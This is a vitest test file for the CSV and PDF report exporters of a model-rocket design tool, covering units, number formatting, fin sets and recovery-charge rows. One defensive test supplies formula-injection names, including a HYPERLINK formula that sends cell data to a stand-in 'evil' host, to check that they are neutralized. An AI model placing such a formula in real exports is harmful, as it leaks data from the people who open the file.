import { describe, it, expect } from 'vitest';
import type { StaticInfo } from '../../../src/engine/openRocketEngine';
import type { ReportModel } from '../../../src/services/report/reportModel';
import { buildComponentCsv, buildDesignCsv } from '../../../src/services/report/reportCsv';
import { METRIC_UNITS, IMPERIAL_UNITS } from '../../../src/prefs/units';
import { qv, summaryRows, type PdfPage } from '../../../src/services/report/pdfPage';
import i18n from '../../../src/i18n';
import es from '../../../src/i18n/locales/es.json';
import { NO_VALUE } from '../../../src/i18n/noValue';

const info = {
  length: 0.9,
  lengthAerodynamic: 0.8,
  refDiameter: 0.079,
  mass: 4.25,
  massEmpty: 3.43,
  cg: 1.382,
  cgEmpty: 1.244,
  cp: 1.629,
  cna: 26.42,
  stabilityCalibers: 3.14,
  stabilityPercent: 30.9,
  rollInertia: 0.0054,
  pitchInertia: 1.83,
  cd: 1.115,
} as unknown as StaticInfo;

const model: ReportModel = {
  name: 'Fireball',
  stages: [{ type: 'stage' }, { type: 'stage' }] as never,
  whole: { label: 'Fireball', info },
  stageSummaries: [
    { label: 'Sustainer', info },
    { label: 'Booster', info },
  ],
  configs: [],
  partsByStage: [],
  finSetsByStage: [
    { stage: 'Sustainer', sets: [{ name: 'Fin set', type: 'trapezoidfinset', topX: 1.118, bottomX: 1.271 }] },
  ],
};

describe('design CSV', () => {
  const csv = buildDesignCsv(model, METRIC_UNITS);
  const rows = csv
    .trimEnd()
    .split('\r\n')
    .map((l) => l.split(','));

  it('starts with the Scope/Field/Value/Unit header', () => {
    expect(rows[0]).toEqual(['Scope', 'Field', 'Value', 'Unit']);
  });

  it('writes a tiny inertia in significant figures rather than as zero', () => {
    const small = { ...info, rollInertia: 4.2e-7, pitchInertia: 0.0001234 } as StaticInfo;
    const out = buildDesignCsv({ ...model, whole: { label: 'Mini', info: small } }, METRIC_UNITS);
    const r = out.split('\r\n').map((l) => l.split(','));
    expect(r).toContainEqual(['Rocket', 'Roll Inertia (Loaded)', '0.00000042', 'kg·m²']);
    expect(r).toContainEqual(['Rocket', 'Pitch Inertia (Loaded)', '0.0001234', 'kg·m²']);
  });

  it('has the Design block', () => {
    expect(rows).toContainEqual(['Design', 'Name', 'Fireball', '']);
    expect(rows).toContainEqual(['Design', 'Design Type', 'Original Design/Other', '']);
    expect(rows).toContainEqual(['Design', 'Stages', '2', '']);
  });

  it.each([
    ['commercial_kit', 'Commercial Kit'],
    ['clonekit', 'Clone of Commercial Kit'],
    ['kit_bash', 'Kit Bash of Commercial Kits'],
    ['homebrew', 'homebrew'],
  ])('names the design type %s the way the desktop does', (designType, label) => {
    const typed = buildDesignCsv({ ...model, designType }, METRIC_UNITS)
      .trimEnd()
      .split('\r\n')
      .map((l) => l.split(','));
    expect(typed).toContainEqual(['Design', 'Design Type', label, '']);
  });

  it('has the Rocket summary in the chosen units with dot decimals', () => {
    expect(rows).toContainEqual(['Rocket', 'Length', '90', 'cm']);
    expect(rows).toContainEqual(['Rocket', 'Stability (on pad)', '3.14', 'cal']);
    expect(rows).toContainEqual(['Rocket', 'Stability (%)', '30.9', '%']);
    expect(rows).toContainEqual(['Rocket', 'CP', '162.9', 'cm']);
    expect(rows).toContainEqual(['Rocket', 'Normal-Force Slope (CNα)', '26.42', '/rad']);
  });

  it('converts values and names the unit when the preference is imperial', () => {
    const imp = buildDesignCsv(model, IMPERIAL_UNITS)
      .trimEnd()
      .split('\r\n')
      .map((l) => l.split(','));
    expect(imp).toContainEqual(['Rocket', 'Length', '35.4331', 'in']);
    expect(imp).toContainEqual(['Rocket', 'Mass (Loaded)', '149.914', 'oz']);
  });

  it('emits a summary block per stage', () => {
    expect(rows).toContainEqual(['Sustainer', 'Length', '90', 'cm']);
    expect(rows).toContainEqual(['Booster', 'Length', '90', 'cm']);
  });

  it('emits fin-set root positions per stage', () => {
    expect(rows).toContainEqual(['Sustainer', 'Fin set: Nose to top of fin root', '111.8', 'cm']);
    expect(rows).toContainEqual(['Sustainer', 'Fin set: Nose to bottom of fin root', '127.1', 'cm']);
  });

  it('quotes a value containing a comma', () => {
    const c = buildDesignCsv({ ...model, name: 'Big, Rocket' }, METRIC_UNITS);
    expect(c).toContain('Design,Name,"Big, Rocket",');
  });

  // Security: `model.name` is from an imported .ork; spreadsheets execute a cell led by = + - @.
  it.each(['=HYPERLINK("http://evil/?"&A1,"Open")', '+1+1', '-1+1', '@SUM(A1)'])(
    'neutralizes a formula-triggering design name: %s',
    (name) => {
      const c = buildDesignCsv({ ...model, name }, METRIC_UNITS);
      const value = c
        .split('\r\n')
        .find((l) => l.startsWith('Design,Name,'))!
        .slice('Design,Name,'.length);
      expect(value.replace(/^"/, '').startsWith("'")).toBe(true);
    },
  );

  it('quotes a bare CR, which would otherwise split the record', () => {
    const c = buildDesignCsv({ ...model, name: 'One\rTwo' }, METRIC_UNITS);
    expect(c).toContain('"One\rTwo"');
  });
});
describe('design CSV rows for a finless design', () => {
  const finless = { ...info, cna: 0, refDiameter: 0 } as StaticInfo;
  const csv = buildDesignCsv({ ...model, whole: { label: 'F', info: finless }, stageSummaries: [] }, METRIC_UNITS);
  const fields = csv
    .split('\r\n')
    .map((l) => l.split(',')[1])
    .filter(Boolean);

  it('omits what OpenRocket omits, as the .ork designinfo does', () => {
    for (const f of ['CP', 'Stability (on pad)', 'Stability (%)', 'Normal-Force Slope (CNα)', 'Fineness (L/D)']) {
      expect(fields).not.toContain(f);
    }
    expect(fields).toContain('Length');
    expect(fields).toContain('Roll Inertia (Loaded)');
  });
});

describe('PDF summary rows', () => {
  const page = { t: i18n.getFixedT('en'), units: METRIC_UNITS } as unknown as PdfPage;

  it('carries the inertia rows the CSV and the .ork carry', () => {
    const labels = summaryRows(page, info).map(([l]) => l);
    expect(labels).toContain(i18n.t('stats.pitchInertia'));
    expect(labels).toContain(i18n.t('stats.rollInertia'));
  });

  it('omits CP and stability for a finless design', () => {
    const labels = summaryRows(page, { ...info, cna: 0 } as StaticInfo).map(([l]) => l);
    expect(labels).not.toContain(i18n.t('report.cp'));
    expect(labels).not.toContain(i18n.t('report.stabilityCal'));
  });
});

describe('buildComponentCsv', () => {
  const parts: ReportModel = {
    ...model,
    partsByStage: [
      {
        stage: 'Sustainer',
        rows: [
          {
            depth: 0,
            type: 'nosecone',
            name: 'Nose',
            material: 'Polystyrene',
            density: 1050,
            length: 0.1,
            outerR: 0.0125,
            mass: 0.012,
          },
          {
            depth: 1,
            type: 'bodytube',
            name: '=HYPERLINK("x")',
            length: 0.3,
            outerR: 0.0125,
            innerR: 0.012,
            thickness: 0.0005,
            mass: 0.02,
          },
        ],
      },
    ],
  };
  const csv = (units = METRIC_UNITS) =>
    buildComponentCsv(parts, units, (type) => ({ nosecone: 'Nose cone', bodytube: 'Body tube' })[type] ?? type)
      .trimEnd()
      .split('\r\n');

  it('writes one row per part, in the chosen units, the header naming them', () => {
    const [head, nose] = csv();
    expect(head).toBe(
      'Stage,Depth,Type,Name,Material,Density (g/cm³),Surface density (g/m²),Line density (g/m),Length (cm),Outer diameter (cm),Inner diameter (cm),Fore diameter (cm),Aft diameter (cm),Thickness (cm),Mass (g)',
    );
    const cells = nose!.split(',');
    expect(cells.slice(0, 5)).toEqual(['Sustainer', '0', 'Nose cone', 'Nose', 'Polystyrene']);
    // A model radius is a diameter in the file.
    expect(Number(cells[9])).toBeCloseTo(2.5, 6);
    expect(cells[10]).toBe('');
  });

  it("writes a transition's two ends in their own columns", () => {
    const withTransition: ReportModel = {
      ...parts,
      partsByStage: [
        {
          stage: 'Sustainer',
          rows: [{ depth: 0, type: 'transition', name: 'T', length: 0.05, foreR: 0.02, aftR: 0.0125, mass: 0.01 }],
        },
      ],
    };
    const [, row] = buildComponentCsv(withTransition, METRIC_UNITS, (type) => type)
      .trimEnd()
      .split('\r\n');
    const cells = row!.split(',');
    expect(Number(cells[11])).toBeCloseTo(4, 6);
    expect(Number(cells[12])).toBeCloseTo(2.5, 6);
  });
  it('keeps a thin wall in a large unit', () => {
    const cells = csv({ ...METRIC_UNITS, length: 'm' })[2]!.split(',');
    expect(cells[13]).toBe('0.0005');
  });

  // `String` writes an exponent below 1e-6, which a spreadsheet can read as text.
  it('writes a very small figure as a plain decimal', () => {
    const tiny: ReportModel = {
      ...parts,
      partsByStage: parts.partsByStage.map((st) => ({
        ...st,
        rows: st.rows.map((r) => ({ ...r, mass: 4e-7 })),
      })),
    };
    const [, row] = buildComponentCsv(tiny, { ...METRIC_UNITS, mass: 'kg' }, (type) => type)
      .trimEnd()
      .split('\r\n');
    expect(row!.split(',').at(-1)).toBe('0.0000004');
  });
  it('writes a soft part density in the column of its kind', () => {
    const soft: ReportModel = {
      ...parts,
      partsByStage: [
        {
          stage: 'S',
          rows: [
            {
              depth: 0,
              type: 'parachute',
              name: 'P',
              material: 'Ripstop nylon',
              density: 0.067,
              densityKind: 'surfaceDensity',
              length: 0.04,
              mass: 0.01,
            },
            {
              depth: 0,
              type: 'shockcord',
              name: 'C',
              material: 'Elastic cord',
              density: 0.0018,
              densityKind: 'lineDensity',
              length: 0.04,
              mass: 0.01,
            },
          ],
        },
      ],
    };
    const [, chute, cord] = buildComponentCsv(soft, METRIC_UNITS, (type) => type)
      .trimEnd()
      .split('\r\n')
      .map((r) => r.split(','));
    expect(chute!.slice(4, 8)).toEqual(['Ripstop nylon', '', '67', '']);
    expect(cord!.slice(4, 8)).toEqual(['Elastic cord', '', '', '1.8']);
  });

  it('keeps a part name from becoming a spreadsheet formula', () => {
    const tube = csv()[2]!;
    expect(tube).toContain("'=HYPERLINK");
  });

  it('leaves a figure the kernel could not give blank', () => {
    const bad: ReportModel = {
      ...parts,
      partsByStage: [
        { stage: 'S', rows: [{ depth: 0, type: 'bodytube', name: 'B', length: NaN, density: Infinity, mass: NaN }] },
      ],
    };
    const [, row] = buildComponentCsv(bad, METRIC_UNITS, (type) => type)
      .trimEnd()
      .split('\r\n');
    const cells = row!.split(',');
    expect([cells[5], cells[8], cells[14]]).toEqual(['', '', '']);
  });
});

describe('design CSV with figures the kernel could not give', () => {
  it('writes them as blank cells, never the no-value glyph', () => {
    const nan = { ...info, length: NaN, mass: NaN, rollInertia: NaN } as StaticInfo;
    const out = buildDesignCsv(
      {
        ...model,
        whole: { label: 'R', info: nan },
        finSetsByStage: [{ stage: 'S', sets: [{ name: 'F', type: 'trapezoidfinset', topX: NaN, bottomX: 1 }] }],
      },
      METRIC_UNITS,
    );
    const r = out.split('\r\n').map((l) => l.split(','));
    expect(r).toContainEqual(['Rocket', 'Length', '', 'cm']);
    expect(r).toContainEqual(['Rocket', 'Roll Inertia (Loaded)', '', 'kg·m²']);
    expect(r).toContainEqual(['S', 'Fin set: Nose to top of fin root', '', 'cm']);
    expect(out).not.toContain(NO_VALUE);
  });
});

describe('design CSV fin-set fields for unnamed fin sets', () => {
  it('names each by its type in the UI language, inside the English field', async () => {
    await i18n.changeLanguage('es');
    try {
      const out = buildDesignCsv(
        {
          ...model,
          finSetsByStage: [
            {
              stage: 'Sustainer',
              sets: [
                { type: 'trapezoidfinset', topX: 1, bottomX: 1.1 },
                { type: 'tubefinset', topX: 0.5, bottomX: 0.6 },
              ],
            },
          ],
        },
        METRIC_UNITS,
      );
      const fields = out.split('\r\n').map((l) => l.split(',')[1]);
      expect(fields).toContain(`${es.part.trapezoidfinset}: Nose to top of fin root`);
      expect(fields).toContain(`${es.part.tubefinset}: Nose to top of fin root`);
    } finally {
      await i18n.changeLanguage('en');
    }
  });
});
describe('report lengths', () => {
  const page = (length: string) =>
    ({ t: i18n.getFixedT('en'), units: { ...METRIC_UNITS, length } }) as unknown as PdfPage;

  it('prints a BT-50 to the thousandth of an inch, and to the tenth of a millimeter', () => {
    expect(qv(page('in'), 'length', 0.02479)).toBe('0.976');
    expect(qv(page('mm'), 'length', 0.02479)).toBe('24.8');
  });
});

describe('the design CSV recovery charges', () => {
  it('writes each role primary, backup and bay, with a missing backup as a blank value', () => {
    const csv = buildDesignCsv(
      {
        ...model,
        charges: [
          { role: 'drogue', tubeId: 'lower', tubeName: 'Lower', primaryKg: 0.0008, backupKg: null },
          { role: 'main', tubeId: 'upper', tubeName: 'Upper', primaryKg: 0.0012, backupKg: 0.0018 },
        ],
      },
      METRIC_UNITS,
    );
    const rows = csv.split('\r\n').filter((l) => l.startsWith('Recovery charges'));
    expect(rows).toEqual([
      'Recovery charges,Drogue charge,0.8,g',
      'Recovery charges,Drogue backup charge,,g',
      'Recovery charges,Drogue charge bay,Lower,',
      'Recovery charges,Main charge,1.2,g',
      'Recovery charges,Main backup charge,1.8,g',
      'Recovery charges,Main charge bay,Upper,',
    ]);
  });

  it('names the tube in each field when a role flies from two bays', () => {
    const csv = buildDesignCsv(
      {
        ...model,
        charges: [
          { role: 'main', tubeId: 'a', tubeName: 'Upper', primaryKg: 0.004, backupKg: 0.0045 },
          { role: 'main', tubeId: 'b', tubeName: 'Main', primaryKg: 0.005, backupKg: 0.0055 },
        ],
      },
      METRIC_UNITS,
    );
    const rows = csv.split('\r\n').filter((l) => l.startsWith('Recovery charges'));
    expect(rows).toEqual([
      'Recovery charges,Main charge (Upper),4,g',
      'Recovery charges,Main backup charge (Upper),4.5,g',
      'Recovery charges,Main charge bay (Upper),Upper,',
      'Recovery charges,Main charge (Main),5,g',
      'Recovery charges,Main backup charge (Main),5.5,g',
      'Recovery charges,Main charge bay (Main),Main,',
    ]);
  });

  it('names the stage as well when the bays are in different stages', () => {
    const csv = buildDesignCsv(
      {
        ...model,
        charges: [
          {
            role: 'main',
            tubeId: 'a',
            tubeName: 'Body tube',
            stageName: 'Sustainer',
            primaryKg: 0.004,
            backupKg: null,
          },
          { role: 'main', tubeId: 'b', tubeName: 'Body tube', stageName: 'Booster', primaryKg: 0.005, backupKg: null },
        ],
      },
      METRIC_UNITS,
    );
    const rows = csv.split('\r\n').filter((l) => l.startsWith('Recovery charges,Main charge ('));
    expect(rows).toEqual([
      'Recovery charges,Main charge (Sustainer: Body tube),4,g',
      'Recovery charges,Main charge (Booster: Body tube),5,g',
    ]);
  });

  it('writes none for a design that saves none', () => {
    expect(buildDesignCsv(model, METRIC_UNITS)).not.toContain('Recovery charges');
  });
});

describe('the design CSV recovery bays', () => {
  it("writes each bay's settings and its ground tests, oldest first", () => {
    const bay = {
      tubeId: 'lower',
      tubeName: 'Lower',
      role: 'drogue',
      devices: ['Drogue'],
      drawn: {
        tubeId: 'lower',
        tubeName: 'Lower',
        boreM: 0.078,
        lengthM: 0.3,
        wholeTube: false,
        pins: { count: 3, size: '2-56', forceN: 155.69, from: null },
      },
      record: {
        flownTestId: 't2',
        tests: [
          { id: 't2', date: '2026-10-30', chargeKg: 0.0012, pins: null, result: 'clean', notes: 'Good' },
          { id: 't1', date: '2026-10-29', chargeKg: 0.001, pins: null, result: 'none', notes: '' },
        ],
      },
    } as never;
    const rows = buildDesignCsv({ ...model, bays: [bay] }, METRIC_UNITS)
      .split('\r\n')
      .filter((l) => l.startsWith('Drogue bay'));
    expect(rows).toEqual([
      'Drogue bay,Tube,Lower,',
      'Drogue bay,Bore,7.8,cm',
      'Drogue bay,Length,30,cm',
      'Drogue bay,Target pressure,1034.21,hPa',
      'Drogue bay,Shear pins,3,',
      'Drogue bay,Shear pin strength,155.69,N',
      'Drogue bay,Test 1 date,2026-10-29,',
      'Drogue bay,Test 1 charge,1,g',
      'Drogue bay,Test 1 shear pins,0,',
      'Drogue bay,Test 1 result,none,',
      'Drogue bay,Test 1 notes,,',
      'Drogue bay,Test 2 date,2026-10-30,',
      'Drogue bay,Test 2 charge,1.2,g',
      'Drogue bay,Test 2 shear pins,0,',
      'Drogue bay,Test 2 result,clean,',
      'Drogue bay,Test 2 notes,Good,',
      'Drogue bay,Test 2 flown,yes,',
    ]);
  });
});
